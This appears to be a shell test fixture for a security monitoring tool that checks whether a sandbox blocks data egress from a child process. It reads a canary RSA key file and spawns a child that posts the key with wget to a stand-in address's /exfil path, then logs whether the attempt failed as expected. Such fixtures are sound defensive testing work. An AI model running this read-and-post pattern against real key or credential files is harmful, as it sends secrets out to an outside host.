#!/bin/sh
set -eu

# ref: /home/mrg/Desktop/exfil-step-a-refs/vet/.github/vet/policy.yml:37 (Dangerous-Workflow signal; controlled child egress fixture)
payload="$(cat /canary/canary_rsa)"
export EXFIL_CHILD_PAYLOAD="$payload"
echo "EXFIL_SAMPLE name=malicious-child canary_read=1 egress_attempt=1 egress_actor=child parent_pid=$$"

sh -c 'exec wget -T 3 -q -O - --post-data "$EXFIL_CHILD_PAYLOAD" http://198.51.100.10/exfil' &
child_pid="$!"
echo "EXFIL_SAMPLE name=malicious-child child_pid=$child_pid"

if wait "$child_pid"; then
  echo "EXFIL_SAMPLE name=malicious-child egress_result=unexpected_success"
else
  echo "EXFIL_SAMPLE name=malicious-child egress_result=failed_expected"
fi
